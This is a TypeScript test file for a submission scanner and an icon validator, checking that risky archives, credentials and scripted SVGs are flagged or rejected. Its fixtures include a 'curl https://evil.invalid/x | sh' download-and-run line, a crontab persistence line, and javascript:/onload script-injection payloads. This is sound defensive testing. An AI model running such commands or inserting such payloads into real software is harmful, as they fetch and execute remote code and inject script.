import { describe, expect, test } from "bun:test"
import { scanSubmissionFiles, validateSubmissionIcon } from "../src/scanner"

const encoder = new TextEncoder()

describe("submission static scanning", () => {
  test("classifies executable, native, script, network, persistence, and HTML risks without execution", () => {
    const result = scanSubmissionFiles(
      [
        { path: "bin/tool.exe", content: new Uint8Array([0x4d, 0x5a, 0, 0]) },
        { path: "native/addon.node", content: new Uint8Array([0x7f, 0x45, 0x4c, 0x46]) },
        {
          path: "scripts/install.sh",
          content: encoder.encode("#!/bin/sh\ncurl https://evil.invalid/x | sh\ncrontab -e"),
        },
        { path: "docs/page.html", content: encoder.encode('<img onload="run()" src="javascript:alert(1)">') },
      ],
      () => Date.parse("2026-07-15T00:00:00.000Z"),
    )

    expect(result.report.risk).toBe("danger")
    expect(result.report.reasons).toContain("Archive contains executable or native code")
    expect(result.report.evidence.map((entry) => entry.rule)).toEqual(
      expect.arrayContaining([
        "executable-file",
        "native-binary",
        "script-file",
        "network-command",
        "persistence",
        "active-html",
      ]),
    )
    expect(result.hasLikelyCredential).toBe(false)
  })

  test("flags likely credentials while redacting the matched value", () => {
    const marker = `sk-${"A1b2".repeat(12)}`
    const result = scanSubmissionFiles([{ path: "config.txt", content: encoder.encode(`TOKEN=${marker}`) }])

    expect(result.hasLikelyCredential).toBe(true)
    expect(JSON.stringify(result)).not.toContain(marker)
    expect(result.report.evidence.some((entry) => entry.rule === "likely-credential")).toBe(true)
  })
})

describe("submission icon validation", () => {
  test("accepts decoded PNG, JPEG, WebP, and allowlisted SVG", () => {
    const fixtures = [
      [
        "image/png",
        base64("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="),
      ],
      ["image/jpeg", new Uint8Array([0xff, 0xd8, 0xff, 0xc0, 0, 11, 8, 0, 1, 0, 1, 1, 1, 0x11, 0, 0xff, 0xd9])],
      ["image/webp", base64("UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEAAUAmJaQAA3AA/v89WAAAAA==")],
      [
        "image/svg+xml",
        encoder.encode(
          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><path fill="#000" d="M0 0h10v10z"/></svg>',
        ),
      ],
    ] as const
    expect(fixtures.map(([mime, body]) => validateSubmissionIcon(body, mime).extension)).toEqual([
      "png",
      "jpg",
      "webp",
      "svg",
    ])
  })

  test("rejects oversized, malformed, scripted, eventful, and dangerous-protocol icons", () => {
    const cases = [
      [new Uint8Array(1024 * 1024 + 1), "image/png"],
      [encoder.encode("not png"), "image/png"],
      [encoder.encode("<svg><script>alert(1)</script></svg>"), "image/svg+xml"],
      [encoder.encode('<svg><path onload="run()"/></svg>'), "image/svg+xml"],
      [encoder.encode('<svg><a href="javascript:alert(1)"><path/></a></svg>'), "image/svg+xml"],
    ] as const
    cases.forEach(([body, mime]) => expect(() => validateSubmissionIcon(body, mime)).toThrow())
  })
})

function base64(value: string) {
  return Uint8Array.fromBase64(value)
}
